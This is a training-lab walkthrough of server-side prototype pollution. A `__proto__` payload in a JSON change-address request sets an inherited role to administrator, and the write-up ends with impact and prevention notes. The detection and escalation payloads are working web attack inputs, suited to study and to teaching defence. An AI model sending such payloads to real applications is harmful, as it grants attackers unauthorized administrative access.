# Lab: Server-side Prototype Pollution via JSON Injection

## Description

This lab demonstrates a **Server-side Prototype Pollution (SSPP)** vulnerability where the application merges user-supplied JSON into a server-side object without properly sanitizing special properties such as `__proto__`.

By injecting properties into `Object.prototype`, an attacker can modify application behavior and influence object properties used throughout the application.

---

## Steps

### 1. Log in

Login using the provided credentials:

```
Username: wiener
Password: peter
```

---

### 2. Intercept the Change Address Request

Navigate to **My Account → Change Address**.

Capture the following request in Burp Suite:

```http
POST /my-account/change-address HTTP/2
Content-Type: application/json

{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"<session>"
}
```

---

### 3. Detect Prototype Pollution

Inject an arbitrary property inside `__proto__`.

```json
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"<session>",
    "__proto__":{
        "foo":"bar"
    }
}
```

The server response now contains:

```json
{
    ...
    "foo":"bar"
}
```

This confirms that prototype pollution is possible.

---

### 4. Identify a Useful Property

Attempt to inject the `role` property.

```json
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"<session>",
    "role":"+AGYAbwBv-"
}
```

The response reflects the injected value:

```json
{
    ...
    "role":"+AGYAbwBv-"
}
```

This indicates that the application reads the `role` property from the object.

---

### 5. Confirm Prototype Inheritance

Now place the `role` property inside `__proto__`.

```json
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"<session>",
    "__proto__":{
        "role":"foo"
    }
}
```

The response becomes:

```json
{
    ...
    "role":"foo"
}
```

The application is now reading the inherited property from `Object.prototype`.

---

### 6. Solve the Lab

Replace the inherited role with administrator.

```json
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"<session>",
    "__proto__":{
        "role":"administrator"
    }
}
```

After sending the request, refresh the application or access the admin functionality to complete the lab.

---

## Vulnerability

The server recursively merges user-controlled JSON into existing objects without filtering dangerous keys like:

- `__proto__`
- `prototype`
- `constructor`

As a result, an attacker can modify `Object.prototype`, causing every newly created object to inherit attacker-controlled properties.

---

## Impact

- Privilege escalation
- Authorization bypass
- Business logic manipulation
- Application-wide property injection
- Potential Remote Code Execution (depending on framework)

---

## Prevention

- Block `__proto__`, `prototype`, and `constructor` during object merging.
- Use safe deep-merge libraries.
- Create objects with `Object.create(null)` where appropriate.
- Freeze or seal prototypes when possible.
- Validate all JSON input before merging.
